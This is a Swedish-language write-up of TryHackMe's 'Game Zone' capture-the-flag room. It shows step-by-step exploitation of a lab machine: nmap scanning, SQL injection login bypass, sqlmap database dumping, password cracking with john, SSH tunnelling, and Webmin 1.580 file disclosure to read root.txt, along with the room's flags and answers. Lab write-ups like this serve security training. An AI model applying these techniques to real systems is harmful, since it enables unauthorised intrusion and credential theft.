---
title: "Game Zone Writeup"
date: 2023-06-14
tags: [writeup, ctf, tryhackme]
description: "Skanna och exploatera ett sårbart webbforum i TryHackMes Game Zone-rum för att få ett shell och eskalera behörigheter."
---

## Setup 

Först måste vi ansluta till tryhackmes VPN-server. Du kan få mer information om detta genom att besöka sidan för [Access](https://tryhackme.com/access).

Jag kommer att använda openvpn för att ansluta till servern. Här är kommandot:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Rekognosering

Att köra `nmap`-skanningar visar följande information:
```shell-session
$ sudo nmap -sS -Pn -vv --top-ports 2000 -oN nmap_scan.txt TARGET_IP 

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

När vi besöker http-tjänsten på port 80 möts vi av följande sida:
![](/assets/img/writeup_assets/game-zone/home-page.png)


> Vad heter den stora tecknade avataren som håller ett prickskyttegevär på forumet?
>
> Svar: Agent 47

På sidan finns det 2 inmatningsformulär. Ett för `Site Search` och ett annat för `User Login`. Vi kan testa om det finns en sårbarhet för databasinjektion (SQL) genom att mata in några SQLi-strängar:
![](/assets/img/writeup_assets/game-zone/sqli-simple-login.png)

När vi lyckas logga in på tjänsten skickas vi vidare till följande sida:
![](/assets/img/writeup_assets/game-zone/portal-login-dash.png)

> Vilken sida omdirigeras du till när du har loggat in?
>
> Svar: `portal.php`

Eftersom målet är sårbart för SQLi kan vi nu använda SQLMap för vidare rekognosering...


Genom att använda Burpsuite och ta reda på förfrågan som skickas av webbläsaren när vi öppnar sidan `portal.php`:
```http
POST /portal.php HTTP/1.1
Host: TARGET_IP
Content-Length: 14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://TARGET_IP
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://TARGET_IP/portal.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=kfd3hokcd5krmlmrofgs4q45q7
Connection: close

searchitem=asd
```

Vi kan spara detta till en fil och sedan skicka det till SQLMap för att autentisera användarsessionen:
```shell-session
$ sqlmap -r portal-request.txt --dbms=mysql --dump

...
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y

...

POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N

...

do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y

...

do you want to crack them via a dictionary-based attack? [Y/n/q] 

...

what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1

...

do you want to use common password suffixes? (slow!) [y/N] N

...
```

Detta ger oss lösenordshashen för användaren: `agent47`.

> Vad är det hashade lösenordet i users-tabellen?
>
> Svar: `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

> Vilket användarnamn var kopplat till det hashade lösenordet?
>
> Svar: `agent47`

Vi får också ut poster listade i en tabell som heter: `post` under databasen: `db`.

> Vad hette den andra tabellen?
>
> Svar: `post`


Nu när vi har lösenordshashen för `agent47` kan vi använda `john` för att knäcka den och få fram användarens lösenord.
```shell-session
$ echo ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 > hash.txt

$ sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
...
videogamer124    (?)     
```

> Vad är det avhashade lösenordet?
>
> Svar: `videogamer124`

Vi kan nu försöka logga in på servern med `ssh` och inloggningsuppgifterna: `agent47:videogamer124`.

## Få åtkomst

Med hjälp av inloggningsuppgifterna från rekognoseringsfasen loggar vi nu in på serverns ssh-tjänst.
```shell-session
$ ssh agent47@TARGET_IP
...
agent47@TARGET_IP's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$
```

Nu kan vi hämta användarflaggan:
```shell-session
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
```

> Vad är användarflaggan?
>
> Svar: `649ac17b1480ac13ef1e4fa579dac95c`

Kontrollerar aktiva socket-anslutningar på målmaskinen:
```shell-session
Netid State      Recv-Q Send-Q                                               Local Address:Port                                                              Peer Address:Port               
udp   UNCONN     0      0                                                                *:10000                                                                        *:*                  
udp   UNCONN     0      0                                                                *:68                                                                           *:*                  
tcp   LISTEN     0      80                                                       127.0.0.1:3306                                                                         *:*                  
tcp   LISTEN     0      128                                                              *:10000                                                                        *:*                  
tcp   LISTEN     0      128                                                              *:22                                                                           *:*                  
tcp   LISTEN     0      128                                                             :::80                                                                          :::*                  
tcp   LISTEN     0      128                                                             :::22                                                                          :::*
```

> Hur många TCP-sockets körs?
>
> Svar: 5

Eftersom tjänsten som körs på port 10000 blockeras av en brandvägg kan vi använda en ssh-tunnel för att exponera den här porten lokalt för oss.
```shell-session
$ ssh -L 10000:localhost:10000 agent47@TARGET_IP
agent47@TARGET_IP's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Sun Nov 27 23:59:23 2022 from TARGET_IP
agent47@gamezone:~$
```

Nu kan vi besöka `localhost:10000` i en webbläsare:
![](/assets/img/writeup_assets/game-zone/localhost-10000.png)



> Vad heter det exponerade CMS-systemet?
>
> Svar: `Webmin`

Med inloggningsuppgifterna: `agent47:videogamer124` kan vi logga in på tjänsten:
![](/assets/img/writeup_assets/game-zone/webmin-dash.png)

> Vilken version har CMS-systemet?
>
> Svar: `1.580`

## Behörighetseskalering

Med `searchsploit` kan vi nu hitta några exploits för `Webmin 1.580`
```shell-session
$ searchsploit webmin 1.58     
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
Webmin 1.580 - '/file/show.cgi' Remote Command Executio | unix/remote/21851.rb
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Discl | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Discl | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metas | linux/webapps/47330.rb
-------------------------------------------------------- ---------------------------------
Shellcodes: No Results


```

Vi kan använda logiken från den andra exploiten. Genom att helt enkelt gå till `localhost:10000/file/show.cgi/root/root.txt` får vi fram innehållet i filen `root.txt`.

> Vad är root-flaggan?
>
> Svar: `a4b945830144bdd71908d12d902adeee`

## Sammanfattning

Om den här writeupen är till hjälp, överväg gärna att följa mig på [github](https://github.com/NovusEdge) och/eller ge repot en stjärna: https://github.com/NovusEdge/thm-writeups


- Rum: [Game Zone](https://tryhackme.com/room/gamezone)
